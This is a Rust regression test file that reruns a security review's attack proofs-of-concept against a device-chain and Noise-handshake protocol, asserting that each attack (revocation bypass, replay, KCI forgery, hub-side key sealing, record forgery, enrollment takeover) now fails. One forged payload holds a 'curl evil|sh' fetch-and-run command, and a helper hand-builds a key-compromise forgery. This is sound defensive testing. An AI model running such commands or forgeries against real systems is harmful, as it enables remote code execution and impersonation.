//! The security review's attack proofs-of-concept, kept as regressions: each
//! test runs the attack as it was written against the first M0 cut and asserts
//! that it now fails.

use ed25519_dalek::SigningKey;

use crate::chain::tests::{fixture, sample_chain};
use crate::chain::{Action, ChainClock, ChainError, ChainState, DeviceInfo, Signer};
use crate::keys::DhKeypair;
use crate::testing::bytes32;

// ---------------------------------------------------------------- B (C1). revocation bypass via AK

/// A removed full device kept AK. It used to recovery-join a fresh device with
/// AK alone and then remove the owner's last full device; now AK signs nothing
/// after genesis, a recovery-join needs RSK (derived from RK, which no device
/// stores), and even an RSK-signed join stays pending and powerless.
#[test]
fn a_removed_full_device_can_no_longer_rejoin_with_ak_and_evict_the_owner() {
    let f = fixture();
    let entries = sample_chain(&f); // seq 4 removes full dev-1
    let mut history = ChainClock::history();
    let mut state = ChainState::verify(&entries, None, &mut history).unwrap();
    assert!(state.device("dev-1").is_none());
    let evil_sign = SigningKey::from_bytes(&bytes32(900));
    let evil_dh = DhKeypair::from_secret(bytes32(901));
    let evil = DeviceInfo {
        id: "dev-evil".into(),
        sign_key: evil_sign.verifying_key().to_bytes(),
        dh_key: evil_dh.public(),
        full: true,
    };

    // The attack as written: AK signs the recovery-join.
    let join = state.draft(Signer::Account, Action::RecoveryJoin(evil.clone()), 6_000).sign(&f.ak);
    assert!(matches!(state.apply(&join, &mut history), Err(ChainError::NotAllowed { .. })));
    assert!(state.authorize_device("dev-evil", &evil_dh.public()).is_err());

    // The removed device signing the join itself is refused too.
    let by_removed = state
        .draft(Signer::Device("dev-1".into()), Action::RecoveryJoin(evil.clone()), 6_000)
        .sign(&f.devices[1].0);
    assert!(state.apply(&by_removed, &mut history).is_err());

    // Even with RK (stolen from the user), the device is pending: no handshake, no eviction.
    let join = state.draft(Signer::Recovery, Action::RecoveryJoin(evil), 6_000).sign(&f.recovery.signing);
    state.apply(&join, &mut history).unwrap();
    assert!(state.authorize_device("dev-evil", &evil_dh.public()).is_err());
    let kick = state
        .draft(Signer::Device("dev-evil".into()), Action::RemoveDevice("dev-0".into()), 6_001)
        .sign(&evil_sign);
    assert!(state.apply(&kick, &mut history).is_err());
    assert!(state.device("dev-0").is_some());
    assert_eq!(state.pending_recoveries(), vec![("dev-evil", 5)], "and every device is told");
}

// ---------------------------------------------------------------- F (LOW). hub-side APPEND overflow

/// An APPEND whose `expect_seq` is u64::MAX used to panic the decoder in debug
/// builds (and wrap in release). It is now refused — and u64 fields beyond
/// 2^53 - 1 are refused outright, as the browser half does.
#[test]
fn an_append_at_u64_max_is_refused_rather_than_panicking() {
    use crate::frame::{Frame, FrameType, RawFrame};
    let mut payload = vec![0u8; 32];
    payload.extend_from_slice(&u64::MAX.to_be_bytes());
    payload.extend_from_slice(&2u16.to_be_bytes());
    for seq in [u64::MAX, 0] {
        payload.extend_from_slice(&seq.to_be_bytes());
        payload.extend_from_slice(&0u32.to_be_bytes());
        payload.extend_from_slice(&[0u8; 12]);
        payload.extend_from_slice(&16u32.to_be_bytes());
        payload.extend_from_slice(&[0u8; 16]);
    }
    let bytes = RawFrame {
        ty: FrameType::Append as u8,
        ch: 1,
        payload,
    }
    .encode()
    .unwrap();
    assert!(Frame::decode(&bytes).is_err());

    // A record exactly at the bound is still an ordinary frame.
    let max = crate::codec::MAX_SAFE_U64;
    let rec = |seq| crate::record::SealedRecord {
        seq,
        epoch: 0,
        nonce: [0; 12],
        ct: vec![0; 16],
    };
    let frame = Frame::Append {
        ch: 1,
        stream: crate::record::StreamId([0; 32]),
        expect_seq: max,
        records: vec![rec(max)],
    };
    assert!(Frame::decode(&frame.encode().unwrap()).is_ok());
}

// ---------------------------------------------------------------- D (C2). unauthenticated sealing

/// Anonymous sealing let anyone — the hub — seal its own MK to an agent, and
/// read everything the agent wrote afterwards. Sealing is now authenticated by
/// the sender's static key, and an agent accepts deliveries only from current
/// full devices of its verified chain.
#[test]
fn the_hub_can_no_longer_seal_an_mk_the_agent_will_accept() {
    use crate::wrap::{open_from, open_from_chain, seal_to, Purpose, SealContext};
    let f = fixture();
    let chain = ChainState::verify(&sample_chain(&f), None, &mut ChainClock::history()).unwrap();
    let agent = &f.machine.1;
    let hub = DhKeypair::from_secret(bytes32(66));
    let hub_mk = [0x66u8; 32];
    let rng = &mut crate::testing::rng(1);
    // Claiming to be dev-0 does not help: the KDF mixes in dev-0's static key.
    let as_dev0 = SealContext {
        purpose: Purpose::MachineKey,
        account: "acct-1".into(),
        sender: "dev-0".into(),
        recipient: "m-1".into(),
        epoch: 0,
    };
    let sealed = seal_to(&hub, &agent.public(), &as_dev0, &hub_mk, rng).unwrap();
    assert!(open_from_chain(agent, "m-1", &chain, &as_dev0, &sealed).is_err());
    assert!(open_from(agent, &f.devices[0].1.public(), &as_dev0, &sealed).is_err());
    // Naming itself as the sender fails: the hub is not a device of the chain.
    let as_hub = SealContext {
        sender: "hub".into(),
        ..as_dev0
    };
    let sealed = seal_to(&hub, &agent.public(), &as_hub, &hub_mk, rng).unwrap();
    assert!(open_from_chain(agent, "m-1", &chain, &as_hub, &sealed).is_err());
}

// ---------------------------------------------------------------- A (H2). replay guard

fn hello_at(ts: u64) -> crate::noise::Hello {
    use crate::noise::{Binding, Initiator, Responder};
    let (device, agent) = (DhKeypair::from_secret(bytes32(1)), DhKeypair::from_secret(bytes32(2)));
    let b = Binding {
        account: "acct-1".into(),
        device: "dev-1".into(),
        machine: "m-1".into(),
    };
    let m1 = Initiator::new(&device, &agent.public(), &b).unwrap().write_hello(ts, b"").unwrap();
    Responder::new(&agent, &b).unwrap().read_hello(&m1).unwrap()
}

/// A hello dated 50 s ahead used to be forgotten a window after it arrived
/// while its timestamp was still "fresh", so the hub could replay it. Entries
/// now live until the timestamp itself is too old to accept.
#[test]
fn a_future_dated_hello_can_no_longer_be_replayed_after_the_guard_forgets_it() {
    use crate::noise::{ChannelError, ReplayGuard};
    let mut guard = ReplayGuard::new(60_000, 60_000, 1024, 0);
    let hello = hello_at(150_000);
    guard.check("dev-1", &hello, 100_000).unwrap();
    assert_eq!(guard.check("dev-1", &hello, 160_001), Err(ChannelError::Replay));
}

/// A restarted agent used to accept a hello replayed from before the restart.
/// A guard with no saved state now refuses every timestamp an earlier process
/// could have accepted (and a persisted one remembers).
#[test]
fn a_restarted_agent_no_longer_accepts_a_replayed_hello() {
    use crate::noise::{ChannelError, ReplayGuard};
    let hello = hello_at(100_000);
    let mut before = ReplayGuard::after_restart(0);
    before.check("dev-1", &hello, 100_000).unwrap();
    let mut after = ReplayGuard::after_restart(100_500); // process restart
    assert_eq!(after.check("dev-1", &hello, 200_000), Err(ChannelError::Replay));
    let mut restored = ReplayGuard::new(600_000, 60_000, 256, 0);
    restored.restore(before.snapshot());
    assert_eq!(restored.check("dev-1", &hello, 200_000), Err(ChannelError::Replay));
}

// ---------------------------------------------------------------- C (H1). freezing the agent's chain view

/// The hub never forwards the removal of dev-1 (stolen) to the agent. With the
/// chain head in the prologue, the honest dev-0 — whose view includes the
/// removal — could not connect at all, while dev-1 could. Now dev-0's hello
/// carries the removal and the agent applies it before authorising anyone;
/// until an honest device connects, a stale view fails the freshness check that
/// guards privileged operations.
#[test]
fn a_hub_that_never_forwards_a_removal_no_longer_keeps_the_removed_device_in_business() {
    use crate::chain::{Attestation, Freshness};
    use crate::handshake::{self, Accepted, AgentSide, HandshakeError};
    use crate::noise::{RekeyPolicy, ReplayGuard};
    let f = fixture();
    let entries = sample_chain(&f);
    let honest = ChainState::verify(&entries, None, &mut ChainClock::history()).unwrap();
    let mut agent_view = ChainState::verify(&entries[..4], None, &mut ChainClock::history()).unwrap(); // frozen before seq 4
    let mut clock = ChainClock::live(0, 0);
    let mut guard = ReplayGuard::new(600_000, 60_000, 16, 0);

    // While frozen, nobody else has vouched for the agent's head: privileged
    // operations from dev-1 are refused; dev-0's attestation shows it is behind.
    assert_eq!(
        agent_view.freshness("dev-1", &[], 10_000, 3_600_000),
        Ok(Freshness::Stale { newest_ms: None })
    );
    let att = Attestation::create(&honest, "dev-0", &f.devices[0].0, 10_000);
    assert_eq!(
        agent_view.freshness("dev-1", std::slice::from_ref(&att), 10_000, 3_600_000),
        Ok(Freshness::Behind { seq: 4 })
    );
    let relayed = [att];

    // The honest device connects and its hello brings the removal.
    let (_, hello) = handshake::start(&honest, &f.devices[0].1, "dev-0", "m-1", 1_000, b"").unwrap();
    let side = AgentSide {
        chain: &mut agent_view,
        clock: &mut clock,
        guard: &mut guard,
        key: &f.machine.1,
        machine: "m-1",
        policy: RekeyPolicy::default(),
        server_info: b"",
        attestations: &relayed,
        freshness_max_age_ms: handshake::FRESHNESS_MAX_AGE_MS,
    };
    // The removal is applied, and dev-0 — now the sole full device — vouches
    // for the view itself (the M2 review dropped the day's wait after a
    // removal: a thief skipped it with a puppet device, the owner could not;
    // every device and machine is alerted to the removal instead).
    assert!(matches!(
        handshake::accept(side, "dev-0", &hello, 1_000),
        Ok(Accepted::Open { applied: 1, .. })
    ));
    // From now on the stolen device is out.
    let stale = ChainState::verify(&entries[..4], None, &mut ChainClock::history()).unwrap();
    let (_, hello) = handshake::start(&stale, &f.devices[1].1, "dev-1", "m-1", 1_001, b"").unwrap();
    let side = AgentSide {
        chain: &mut agent_view,
        clock: &mut clock,
        guard: &mut guard,
        key: &f.machine.1,
        machine: "m-1",
        policy: RekeyPolicy::default(),
        server_info: b"",
        attestations: &relayed,
        freshness_max_age_ms: handshake::FRESHNESS_MAX_AGE_MS,
    };
    assert_eq!(handshake::accept(side, "dev-1", &hello, 1_001).err(), Some(HandshakeError::Unauthorized));
}

// ---------------------------------------------------------------- E (M1). KCI on message 1

mod noise_by_hand {
    use aes_gcm::aead::{Aead, Payload};
    use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
    use hmac::{Hmac, Mac};
    use sha2::{Digest, Sha256};

    fn hmac(key: &[u8], data: &[&[u8]]) -> [u8; 32] {
        let mut m = <Hmac<Sha256> as Mac>::new_from_slice(key).unwrap();
        for d in data {
            m.update(d);
        }
        m.finalize().into_bytes().into()
    }
    pub fn mix_key(ck: &mut [u8; 32], ikm: &[u8]) -> [u8; 32] {
        let temp = hmac(ck, &[ikm]);
        let one = hmac(&temp, &[&[1]]);
        let two = hmac(&temp, &[&one, &[2]]);
        *ck = one;
        two
    }
    pub fn mix_hash(h: &mut [u8; 32], data: &[u8]) {
        let mut s = Sha256::new();
        s.update(*h);
        s.update(data);
        *h = s.finalize().into();
    }
    fn nonce(n: u64) -> [u8; 12] {
        let mut out = [0u8; 12];
        out[4..].copy_from_slice(&n.to_be_bytes());
        out
    }
    pub fn enc(k: &[u8; 32], n: u64, ad: &[u8], pt: &[u8]) -> Vec<u8> {
        Aes256Gcm::new_from_slice(k)
            .unwrap()
            .encrypt(Nonce::from_slice(&nonce(n)), Payload { msg: pt, aad: ad })
            .unwrap()
    }
    pub fn dec(k: &[u8; 32], n: u64, ad: &[u8], ct: &[u8]) -> Option<Vec<u8>> {
        Aes256Gcm::new_from_slice(k)
            .unwrap()
            .decrypt(Nonce::from_slice(&nonce(n)), Payload { msg: ct, aad: ad })
            .ok()
    }
}

/// With only the agent's static key (a leaked machine-key file), anyone could
/// forge a first message "from" any device carrying a terminal-input request.
/// The first message now carries no request — a free-form payload does not
/// even parse — and a forged *well-formed* hello gets the forger nothing: it
/// cannot read the reply, so it never has a transport key to send a request
/// with.
#[test]
fn a_kci_forged_first_message_can_no_longer_carry_or_lead_to_a_request() {
    use crate::handshake::{self, Accepted, AgentSide, HandshakeError, HelloBody};
    use crate::noise::{Binding, RekeyPolicy, ReplayGuard, PATTERN};
    use noise_by_hand::*;
    let f = fixture();
    let mut state = ChainState::verify(&sample_chain(&f), None, &mut ChainClock::history()).unwrap();
    let agent = &f.machine.1; // leaked
    let victim_pub = f.devices[0].1.public(); // public, from the chain
    let b = Binding {
        account: state.account().into(),
        device: "dev-0".into(),
        machine: "m-1".into(),
    };
    let forge = |payload: &[u8], e_seed: u64| {
        let mut h = [0u8; 32];
        h[..PATTERN.len()].copy_from_slice(PATTERN.as_bytes());
        let mut ck = h;
        mix_hash(&mut h, &b.prologue().unwrap());
        mix_hash(&mut h, &agent.public());
        let e = DhKeypair::from_secret(bytes32(e_seed));
        mix_hash(&mut h, &e.public());
        let k1 = mix_key(&mut ck, &*e.agree(&agent.public()).unwrap());
        let s_ct = enc(&k1, 0, &h, &victim_pub);
        mix_hash(&mut h, &s_ct);
        let k2 = mix_key(&mut ck, &*agent.agree(&victim_pub).unwrap()); // ss via the leaked key
        let p_ct = enc(&k2, 0, &h, payload);
        mix_hash(&mut h, &p_ct);
        ([&e.public()[..], &s_ct, &p_ct].concat(), e, ck, h)
    };
    let mut clock = ChainClock::live(0, 5); // enrolled after the sample chain
    let mut guard = ReplayGuard::new(600_000, 60_000, 16, 0);
    // The hub relays dev-0's attestation to anyone; it makes the view fresh.
    let relayed = [crate::chain::Attestation::create(&state, "dev-0", &f.devices[0].0, 900)];

    // The attack as written: a request in the first message. It does not parse.
    let mut body = 1_000u64.to_be_bytes().to_vec();
    body.extend_from_slice(br#"{"rpc":"POST /api/terminals/1/input","data":"curl evil|sh\n"}"#);
    let (msg, ..) = forge(&body, 777);
    let side = AgentSide {
        chain: &mut state,
        clock: &mut clock,
        guard: &mut guard,
        key: agent,
        machine: "m-1",
        policy: RekeyPolicy::default(),
        server_info: b"",
        attestations: &relayed,
        freshness_max_age_ms: handshake::FRESHNESS_MAX_AGE_MS,
    };
    assert!(matches!(
        handshake::accept(side, "dev-0", &msg, 1_000),
        Err(HandshakeError::Chain(_)) | Err(HandshakeError::Decode(_))
    ));

    // A well-formed forged hello is accepted at the handshake level (that is
    // what KCI means) — but the forger cannot read the reply.
    let hello = HelloBody {
        chain_seq: state.seq(),
        chain_head: state.head(),
        entries: vec![],
        client: vec![],
    };
    let mut body = 1_000u64.to_be_bytes().to_vec();
    body.extend_from_slice(&hello.encode().unwrap());
    let (msg, e, mut ck, mut h) = forge(&body, 778);
    let side = AgentSide {
        chain: &mut state,
        clock: &mut clock,
        guard: &mut guard,
        key: agent,
        machine: "m-1",
        policy: RekeyPolicy::default(),
        server_info: b"",
        attestations: &relayed,
        freshness_max_age_ms: handshake::FRESHNESS_MAX_AGE_MS,
    };
    let Ok(Accepted::Open { reply, .. }) = handshake::accept(side, "dev-0", &msg, 1_000) else {
        panic!("KCI is inherent to IK's first message")
    };
    let re: [u8; 32] = reply[..32].try_into().unwrap();
    mix_hash(&mut h, &re);
    mix_key(&mut ck, &*e.agree(&re).unwrap()); // ee
                                               // se needs DH(victim's static secret, re); the best the forger can do is guess.
    let guess = mix_key(&mut ck, &*agent.agree(&re).unwrap());
    assert!(dec(&guess, 0, &h, &reply[32..]).is_none(), "the forger cannot complete the handshake");
}

// ---------------------------------------------------------------- M2. record origin and freshness

/// Any holder of a stream key — a removed device, for the epochs it held —
/// could append records the reader accepted, the hub could drop the newest
/// records unnoticed, and `resume` trusted a manifest nobody signed. Records
/// are now released only under a head the machine signed, a head beyond what
/// arrived is reported as withholding, and a reader can start only from a
/// signed head.
#[test]
fn forged_withheld_and_unsigned_records_are_no_longer_accepted() {
    use crate::record::tests::{machine, sid, MK};
    use crate::record::{Compression, LogReader, LogWriter, RecordError, SignedHead, StreamHead};
    let rng = &mut crate::testing::rng(5);
    let machine_key = machine().verifying_key().to_bytes();
    let mut agent = LogWriter::new(&MK, 0, sid(), 0, [0; 32]);
    let r0 = agent.append(1, b"genuine 0", Compression::None, rng).unwrap();
    let r1 = agent.append(1, b"genuine 1", Compression::None, rng).unwrap();

    // A removed device holds MK for epoch 0 and appends its own record 2,
    // correctly linked; the hub serves it with the machine's genuine head... which
    // covers only 0..2, so record 2 is never released.
    let mut thief = LogWriter::new(&MK, 0, sid(), 2, r1.link(&sid(), &r0.link(&sid(), &[0; 32])));
    let forged = thief.append(1, b"forged 2", Compression::None, rng).unwrap();
    let mut reader = LogReader::new(sid(), machine_key);
    reader.add_epoch(0, &MK);
    for r in [&r0, &r1, &forged] {
        reader.push(r).unwrap();
    }
    let released = reader.confirm(&agent.head(&machine(), 1_000)).unwrap();
    assert_eq!(released.len(), 2, "only what the machine signed");
    // The thief cannot sign a head for its record; a head it signs is refused.
    assert_eq!(
        reader.confirm(&thief.head(&SigningKey::from_bytes(&bytes32(9)), 2_000)),
        Err(RecordError::BadHead)
    );

    // The genuine record 2 and a head covering it, but the hub serves the forged one:
    let r2 = agent.append(1, b"genuine 2", Compression::None, rng).unwrap();
    let mut reader = LogReader::new(sid(), machine_key);
    reader.add_epoch(0, &MK);
    for r in [&r0, &r1, &forged] {
        reader.push(r).unwrap();
    }
    assert_eq!(reader.confirm(&agent.head(&machine(), 3_000)), Err(RecordError::Forged));
    let _ = r2;

    // The hub drops the newest record: the head says three, two arrived.
    let mut reader = LogReader::new(sid(), machine_key);
    reader.add_epoch(0, &MK);
    reader.push(&r0).unwrap();
    reader.push(&r1).unwrap();
    assert_eq!(
        reader.confirm(&agent.head(&machine(), 4_000)),
        Err(RecordError::Incomplete { have: 2, head: 3 })
    );

    // Starting mid-stream needs a head the machine signed.
    let unsigned = SignedHead {
        head: StreamHead {
            stream: sid(),
            next_seq: 2,
            epoch: 0,
            link: [0; 32],
            time_ms: 0,
        },
        signature: [0; 64],
    };
    assert!(LogReader::from_head(machine_key, &unsigned).is_err());
}

// ---------------------------------------------------------------- M3. enrollment takeover by the hub

/// A hub-issued token proved nothing, and a short code derived from public
/// values could be ground in about a million tries, so the hub could enroll a
/// machine of its own. The code now carries a device-generated secret the hub
/// never sees, and the agent must prove it holds it for the exact keys it enrolls.
#[test]
fn the_hub_can_no_longer_enroll_a_machine_of_its_own() {
    use crate::identity::{EnrollCode, MachineIdentity};
    let code = EnrollCode::generate([7; 16], &mut crate::testing::rng(11));
    let real = MachineIdentity::from_seed(&bytes32(12));
    let hub_machine = MachineIdentity::from_seed(&bytes32(13));
    // The hub knows the token and the fingerprint, not the secret: any secret it
    // tries yields a different token, and a proof under it does not verify.
    for guess in 1_000..2_000u64 {
        let attempt = EnrollCode {
            account_fingerprint: code.account_fingerprint,
            secret: bytes32(guess)[..16].try_into().unwrap(),
        };
        assert_ne!(attempt.token(), code.token());
        let proof = attempt.proof("acct-1", "m-1", &hub_machine.sign_public(), &hub_machine.dh_public());
        assert!(!code.verify_proof("acct-1", "m-1", &hub_machine.sign_public(), &hub_machine.dh_public(), &proof));
    }
    // Nor can it re-use the real agent's proof for its own keys.
    let proof = code.proof("acct-1", "m-1", &real.sign_public(), &real.dh_public());
    assert!(code.verify_proof("acct-1", "m-1", &real.sign_public(), &real.dh_public(), &proof));
    assert!(!code.verify_proof("acct-1", "m-1", &hub_machine.sign_public(), &hub_machine.dh_public(), &proof));
}

// ---------------------------------------------------------------- the M2 review's PoCs

mod m2 {
    use super::*;
    use crate::chain::tests::{device_info, h};
    use crate::chain::{genesis_draft, recovery_keys, Attestation, Freshness, RecoveryKey, RECOVERY_DELAY_MS};
    use crate::testing::rng;
    use crate::wrap::{open_from_recovery, seal_for_recovery, Purpose, SealContext, WrapError, RECOVERY_RECIPIENT};

    fn rk_ctx(sender: &str, epoch: u32) -> SealContext {
        SealContext {
            purpose: Purpose::UserKey,
            account: "acct-1".into(),
            sender: sender.into(),
            recipient: RECOVERY_RECIPIENT.into(),
            epoch,
        }
    }

    /// The removed dev-1 seals a UK of its choosing for the recovery key. A
    /// recovering device does not take it: whoever sealed a package, the key
    /// must be the one the chain committed (a package from a device no longer
    /// current opens only that way).
    #[test]
    fn a_removed_device_can_no_longer_plant_a_recovery_package() {
        let f = fixture();
        let chain = crate::wrap::tests::committed(&f, &[[0x10; 32], [0x11; 32]], &[]);
        let rsk = chain.recovery_key().unwrap();
        let sealed = seal_for_recovery(&f.devices[1].1, "dev-1", "acct-1", &rsk, 1, &[0xAA; 32], &mut rng(1)).unwrap();
        let rk = recovery_keys(&f.rk);
        assert!(matches!(
            open_from_recovery(&rk, &chain, &rk_ctx("dev-1", 1), &sealed),
            Err(WrapError::Uncommitted(_))
        ));
        // Nor through a current device that seals a key the chain never committed.
        let planted = seal_for_recovery(&f.devices[0].1, "dev-0", "acct-1", &rsk, 1, &[0xAA; 32], &mut rng(2)).unwrap();
        assert!(matches!(
            open_from_recovery(&rk, &chain, &rk_ctx("dev-0", 1), &planted),
            Err(WrapError::Uncommitted(_))
        ));
    }

    /// The hub builds a chain under its own `AK` around the account's real
    /// (public) `RSK`. It cannot sign the recovery key's proof over its own
    /// root, and the real proof is over the real root: the fabricated genesis
    /// does not verify, so there is nothing for the recovering device to join.
    #[test]
    fn a_hub_fabricated_chain_no_longer_fools_a_recovering_device() {
        let f = fixture();
        let real = ChainState::verify(&sample_chain(&f), None, &mut h()).unwrap();
        let real_genesis = &sample_chain(&f)[0];
        let crate::chain::Action::Genesis {
            recovery_key: Some(real_rk), ..
        } = real_genesis.draft.action
        else {
            panic!("genesis")
        };
        assert_eq!(real_rk.key, real.recovery_key().unwrap());
        let hub_ak = SigningKey::from_bytes(&bytes32(900));
        let hub_dev = DeviceInfo {
            id: "dev-h".into(),
            sign_key: SigningKey::from_bytes(&bytes32(901)).verifying_key().to_bytes(),
            dh_key: DhKeypair::from_secret(bytes32(902)).public(),
            full: true,
        };
        // Copying the real proof: it is over the real AK.
        let copied = genesis_draft("acct-1", hub_ak.verifying_key().to_bytes(), hub_dev.clone(), Some(real_rk), 1_000).sign(&hub_ak);
        assert!(matches!(
            ChainState::verify(std::slice::from_ref(&copied), None, &mut h()),
            Err(ChainError::NotAllowed { seq: 0, .. })
        ));
        // Signing a proof of its own needs RSK's secret, which only RK gives.
        let forged = RecoveryKey {
            proof: [0x42; 64],
            ..real_rk
        };
        let g = genesis_draft("acct-1", hub_ak.verifying_key().to_bytes(), hub_dev, Some(forged), 1_000).sign(&hub_ak);
        assert!(ChainState::verify(std::slice::from_ref(&g), None, &mut h()).is_err());
    }

    /// The day of distrust after a removal was skipped by a thief with a puppet
    /// device yet locked the honest owner out. It is gone (alerts to every
    /// device and machine replace it): a sole device that removed the others
    /// vouches for itself at once — the PoC's premise (the owner is Stale, the
    /// thief is not) no longer holds either way.
    #[test]
    fn the_sole_device_rule_that_a_puppet_skipped_is_gone() {
        let f = fixture();
        let entries = sample_chain(&f);
        let mut clock = ChainClock::live(1_000, 0);
        let mut state = ChainState::verify(&entries, None, &mut clock).unwrap();
        clock.set_now(10_000);
        let add3 = state
            .draft(Signer::Device("dev-0".into()), Action::AddDevice(device_info(&f, 3, true)), 10_000)
            .sign(&f.devices[0].0);
        state.apply(&add3, &mut clock).unwrap();
        let rm = state
            .draft(Signer::Device("dev-0".into()), Action::RemoveDevice("dev-3".into()), 10_001)
            .sign(&f.devices[0].0);
        state.apply(&rm, &mut clock).unwrap();
        let own = Attestation::create(&state, "dev-0", &f.devices[0].0, 10_002);
        assert_eq!(state.freshness("dev-0", &[own], 10_002, 12 * 3_600_000), Ok(Freshness::Fresh));
    }

    /// A browser that re-verified with a history clock on every page load
    /// accepted a join and its activation delivered together. A verifier now
    /// comes back with the clock it saved — live from the seq after the last
    /// one it had seen — and refuses them.
    #[test]
    fn a_page_load_no_longer_accepts_an_instant_self_activation() {
        let f = fixture();
        let mut entries = sample_chain(&f);
        let seen = entries.len() as u64; // what the browser had verified last time
        let mut state = ChainState::verify(&entries, None, &mut h()).unwrap();
        let rk = recovery_keys(&f.rk);
        let me = DeviceInfo {
            id: "dev-r".into(),
            ..device_info(&f, 3, true)
        };
        let join = state.draft(Signer::Recovery, Action::RecoveryJoin(me), 6_000).sign(&rk.signing);
        state.apply(&join, &mut h()).unwrap();
        entries.push(join);
        entries.push(
            state
                .draft(Signer::Recovery, Action::ActivateRecovered("dev-r".into()), 7_000)
                .sign(&rk.signing),
        );
        // The next page load, 1 s later: live from `seen`.
        let mut reload = ChainClock::live(50_000, seen);
        assert!(matches!(
            ChainState::verify(&entries, None, &mut reload),
            Err(ChainError::TooEarly { .. })
        ));
        // A verifier that started after the join (an agent enrolled then) waits a full delay from then.
        let mut enrolled = ChainClock::live(50_000, seen + 1);
        let mut view = ChainState::verify(&entries[..entries.len() - 1], None, &mut enrolled).unwrap();
        enrolled.set_now(50_000 + RECOVERY_DELAY_MS - 1);
        assert!(matches!(
            view.apply(entries.last().unwrap(), &mut enrolled),
            Err(ChainError::TooEarly { .. })
        ));
        enrolled.set_now(50_000 + RECOVERY_DELAY_MS);
        view.apply(entries.last().unwrap(), &mut enrolled).unwrap();
    }

    /// The agent PoC: a full device later removed pushes the machine key to
    /// epoch u32::MAX (or any key of its own) so every later rotation fails.
    /// Machine keys are now exactly what the chain committed, one epoch after
    /// the last, so neither the key nor the epoch can be the device's choice.
    #[test]
    fn a_machine_key_epoch_out_of_reach_is_refused() {
        let f = fixture();
        let chain = crate::wrap::tests::committed(&f, &[], &[[0; 32]]);
        let agent = &f.machine.1;
        let ctx = SealContext {
            purpose: Purpose::MachineKey,
            account: "acct-1".into(),
            sender: "dev-0".into(),
            recipient: "m-1".into(),
            epoch: u32::MAX,
        };
        let evil = crate::wrap::seal_to(&f.devices[0].1, &agent.public(), &ctx, &[0xAA; 32], &mut rng(3)).unwrap();
        assert!(matches!(
            crate::wrap::open_machine_key(agent, "m-1", &chain, &ctx, &evil),
            Err(WrapError::Uncommitted(ChainError::UncommittedKey { .. }))
        ));
        // And the chain itself refuses a jump.
        let jump = chain
            .draft(
                Signer::Device("dev-0".into()),
                Action::KeyEpochs(crate::chain::KeyCommits {
                    user: None,
                    machines: vec![(
                        "m-1".into(),
                        crate::chain::KeyCommit {
                            epoch: u32::MAX,
                            hash: [0; 32],
                        },
                    )],
                }),
                0,
            )
            .sign(&f.devices[0].0);
        assert!(chain.clone().apply(&jump, &mut h()).is_err());
    }

    /// The agent PoC's third point: a manifest no longer says in the clear
    /// which kind of stream it is.
    #[test]
    fn a_manifest_no_longer_carries_its_format_in_the_clear() {
        use crate::record::{stream_id, LogWriter};
        use crate::stream::Manifest;
        let machine = SigningKey::from_bytes(&bytes32(40));
        let mk = [7u8; 32];
        let encoded: Vec<Vec<u8>> = ["rh.index", "rh.status"]
            .iter()
            .map(|src| {
                let sid = stream_id(&mk, src, "").unwrap();
                let head = LogWriter::new(&mk, 0, sid, 3, [0; 32]).head(&machine, 1);
                Manifest::sign(head, vec![], &machine).unwrap().encode()
            })
            .collect();
        // Past the signed head (whose fields are the same for both), the two
        // manifests differ only in their signatures.
        let head_len = 32 + 8 + 4 + 32 + 8 + 64;
        assert_eq!(encoded[0].len(), encoded[1].len());
        assert_eq!(&encoded[0][head_len..head_len + 2], &[0, 0], "the page count, and nothing about the kind");
    }
}

// ---------------------------------------------------------------- the M2 re-review's PoCs

mod m2_verify {
    use super::*;
    use crate::chain::tests::{h, recovered_device};
    use crate::chain::{Merged, RECOVERY_DELAY_MS};

    /// A hub sends `[RecoveryJoin, <a spoiled entry>]` in one batch. The join
    /// is applied and stays applied; the batch must say so — how many took
    /// effect, and what stopped it — so the verifier alerts about the join,
    /// rather than treating the whole batch as refused.
    #[test]
    fn a_batch_that_fails_half_way_says_what_it_applied() {
        let f = fixture();
        let entries = sample_chain(&f);
        let mut hub = ChainState::verify(&entries, None, &mut h()).unwrap();
        // The agent, enrolled after the sample chain.
        let mut clock = ChainClock::live(10_000, entries.len() as u64);
        let mut agent = ChainState::verify(&entries, None, &mut clock).unwrap();
        let before = agent.seq();
        let join = hub
            .draft(Signer::Recovery, Action::RecoveryJoin(recovered_device(&f)), 6_000)
            .sign(&f.recovery.signing);
        hub.apply(&join, &mut h()).unwrap();
        let mut bogus = hub
            .draft(Signer::Device("dev-0".into()), Action::RemoveMachine("m-1".into()), 7_000)
            .sign(&f.devices[0].0);
        bogus.signature[0] ^= 1;

        let merged = agent.merge_partial(&[join.clone(), bogus.clone()], &mut clock);
        assert_eq!(
            merged,
            Merged {
                applied: 1,
                error: Some(ChainError::BadSignature { seq: before + 2 })
            }
        );
        assert_eq!(
            agent.entries_after(Some(before)),
            std::slice::from_ref(&join),
            "what took effect, to alert about"
        );
        assert_eq!(
            clock.first_seen().get(&(before + 1)),
            Some(&10_000),
            "the join's first sighting is the agent's"
        );

        // A self-activation that comes at once with the join (an agent that
        // missed the day): the join lands, the activation waits — a day from
        // this agent's own first sighting of the join.
        let mut late = ChainClock::live(50_000, entries.len() as u64);
        let mut view = ChainState::verify(&entries, None, &mut late).unwrap();
        let activate = hub
            .draft(Signer::Recovery, Action::ActivateRecovered("dev-r".into()), 8_000)
            .sign(&f.recovery.signing);
        let merged = view.merge_partial(&[join.clone(), activate.clone()], &mut late);
        assert_eq!(merged.applied, 1);
        assert!(matches!(merged.error, Some(ChainError::TooEarly { ready_ms, .. }) if ready_ms == 50_000 + RECOVERY_DELAY_MS));
        assert!(view.device_record("dev-r").is_some(), "the join is in, pending");
        late.set_now(50_000 + RECOVERY_DELAY_MS);
        assert_eq!(view.merge(&[join, activate], &mut late), Ok(1));
        assert!(view.device("dev-r").is_some());
    }
}
